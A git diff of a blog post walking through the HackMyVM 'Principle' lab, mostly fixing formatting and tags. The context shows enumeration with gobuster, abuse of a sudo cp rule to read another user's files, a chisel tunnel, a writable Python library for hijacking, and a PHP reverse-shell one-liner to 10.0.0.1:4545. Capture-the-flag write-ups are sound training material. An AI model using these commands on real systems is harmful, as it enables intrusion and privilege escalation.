@@ -2,7 +2,7 @@
 title: HMV Principle walkthrough
 date: 2023-07-28 00:00:01 +0000
 categories: [hmv, walkthrough]
-tags: [hackmyvm, walkthrough, hmv, virtualhost, form abuse, rbash escape, sudoers misconfiguration, privilege escalation, python library hijacking, reverse proxy, chisel]
+tags: [hackmyvm, walkthrough, hmv, virtualhost, form abuse, rbash escape, find abuse, cp abuse, sudoers misconfiguration, reverse proxy, chisel, privilege escalation, python library hijacking]
 img_path: /assets/img/posts/
 ---
 
@@ -86,7 +86,8 @@ Let's look for hidden resources in `investigate`:
 
 ```
 $ gobuster dir -u http://10.0.0.2/investigate -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x php,txt,html
-
+```
+```
 /index.html           (Status: 200) [Size: 812]
 /rainbow_mystery.txt  (Status: 200) [Size: 596]
 ```
@@ -149,7 +150,9 @@ Let's search virtual hosts here:
 
 ```
 $ gobuster vhost --append-domain -u t4l0s.hmv -r -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+```
 
+```
 Found: hellfire.t4l0s.hmv Status: 200 [Size: 1659]
 ```
 
@@ -163,7 +166,7 @@ $ echo "10.0.0.2 hellfire.t4l0s.hmv" | sudo tee -a /etc/hosts
 
 If we browse to our new domain we have a new web.
 
-![hellfire.t4l0s.hmv](hmv-`Principle`-hellfire-t4l0s.png)
+![hellfire.t4l0s.hmv](hmv-Principle-hellfire-t4l0s.png)
 *hellfire.t4l0s.hmv*
 
 ## Source code
@@ -180,7 +183,9 @@ We will search for hidden files or directories:
 
 ```
 $ gobuster dir -u http://hellfire.t4l0s.hmv --wordlist /opt/wordlists/dirb/common.txt -b 403,404 -x php,txt,html
+```
 
+```
 /index.php            (Status: 200) [Size: 1659]
 /upload.php           (Status: 200) [Size: 748]
 /output.php           (Status: 200) [Size: 1350]
@@ -247,6 +252,9 @@ Once our file is uploaded we got shell!
 ```
 $ whoami
 www-data
+```
+
+```
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -257,7 +265,9 @@ We find other users in this machinne.
 
 ```
 $ cat /etc/passwd
+```
 
+```
 talos:x:1000:1000:Talos,,,:/home/talos:/bin/bash
 sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
 elohim:x:1001:1001::/home/gehenna:/bin/rbash
@@ -266,7 +276,9 @@ sml:x:1002:1002::/home/sml:/bin/bash
 
 ```
 $ ls -la /home
+```
 
+```
 drwxr-xr-x  4 elohim elohim 4096 Jul 14 11:25 gehenna
 drwxr-xr-x  4 talos  talos  4096 Jul 14 07:26 talos
 ```
@@ -293,6 +305,9 @@ The `find` binary seems suspicious:
 
 ```
 $ ls -la find
+```
+
+```
 -rwsr-xr-x  1 talos root     224848 Jan  8  2023 find
 ```
 
@@ -304,7 +319,9 @@ If we check `/home/talos` we find a note:
 
 ```
 $ ls -la /home/talos
+```
 
+```
 -rw-r----- 1 talos talos  320 Jul 13 15:42 note.txt
 ```
 
@@ -347,7 +364,7 @@ $ su - talos
 Let's see what we can do:
 
 ```
-talos@`Principle`:~$ sudo -l
+talos@Principle:~$ sudo -l
 Matching Defaults entries for talos on `Principle`:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
@@ -363,7 +380,7 @@ Now, we can use `/bin/cp` as `elohim`.
 Let's see what we can find in `/home/gehenna`:
 
 ```
-talos@`Principle`:~$ ls -la /home/gehenna/
+talos@Principle:~$ ls -la /home/gehenna/
 total 40
 drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .
 drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
@@ -380,7 +397,7 @@ drwx------ 2 elohim elohim 4096 Jul  6 11:05 .ssh
 We can get our first flag:
 
 ```
-talos@`Principle`:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdout
+talos@Principle:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdout
 ```
 
 `lock` seems an interesting file, above all after the hint that `talos` give us:
@@ -390,7 +407,7 @@ talos@`Principle`:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdou
 So we print the file content and keep a copy of in our machine:
 
 ```
-talos@`Principle`$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdout
+talos@Principle$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdout
 ```
 
 Another interesting directory is `.ssh`.
@@ -450,7 +467,7 @@ There is a ssh service running. Now we have to find in which port:
 
 ```
 $ ss -tunel
-talos@`Principle`:~/.ssh$ ss -tunel
+talos@Principle:~/.ssh$ ss -tunel
 Netid          State           Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process                                                                
 udp            UNCONN          0                0                                0.0.0.0:68                            0.0.0.0:*              ino:14407 sk:1 cgroup:/system.slice/ifup@enp0s3.service <->           
 tcp            LISTEN          0                128                              0.0.0.0:3445                          0.0.0.0:*              ino:14524 sk:2 cgroup:/system.slice/ssh.service <->
@@ -461,10 +478,10 @@ Ok. There is a SSH service running on port 3445 and not exposed to the outside.
 As we don't have permissions to execute ssh, we need to do a reverse proxy tuneling.
 And, for this, we are going yo use `chisel`.
 
-We need to know the machine architecture to know what chisel binary upload:
+We need to know the machine architecture to know what `chisel` binary upload:
 
 ```
-talos@`Principle`:~/.ssh$ uname -a
+talos@Principle:~/.ssh$ uname -a
 Linux `Principle` 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
 ```
 
@@ -523,7 +540,7 @@ Don't worry, rember the words of `talos`:
 This is where the `.lock` file will be useful.
 
 The file content is: `7072696e6369706c6573`, and we know that is encoded.
-It's encoded in hexadecimal, if we decode it we obtain: ``Principle`s`, and this is this passphrase.
+It's encoded in hexadecimal, if we decode it we obtain: `principles`, and this is this passphrase.
 Now we can connect via ssh to the `Principle` machine.
 
 ```
@@ -537,7 +554,7 @@ We are already inside and we are `elohim`
 ## elohim
 
 ```
-elohim@`Principle`:~$ id
+elohim@Principle:~$ id
 uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
 ```
 
@@ -557,7 +574,7 @@ So, we need to escape from the `rbash`.
 We can escape from the `rbash` and get a `bash` shell using php:
 
 ```
-elohim@`Principle`:~$ php -r '$sock=fsockopen("10.0.0.1",4545);exec("/bin/bash -i <&3 >&3 2>&3");'
+elohim@Principle:~$ php -r '$sock=fsockopen("10.0.0.1",4545);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 To move confortably we will disable the following restricted aliases:
@@ -570,8 +587,10 @@ $ unalias vi
 If we check the `reviwer.py` script, we can see that we don't have permissions to write it, but we can read it:
 
 ```
-elohim@`Principle`:~$ ls -la /opt/
+elohim@Principle:~$ ls -la /opt/
+```
 
+```
 -rwxr-xr-x  1 root root 1072 Jul  7 15:17 reviewer.py
 ```
 
@@ -591,7 +610,7 @@ nano /usr/lib/python3.11/subprocess.py
 Let's check the library permissions:
 
 ```
-elohim@`Principle`:~$ ls -la /usr/lib/python3.11/subprocess.py
+elohim@Principle:~$ ls -la /usr/lib/python3.11/subprocess.py
 -rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.py
 ```
 
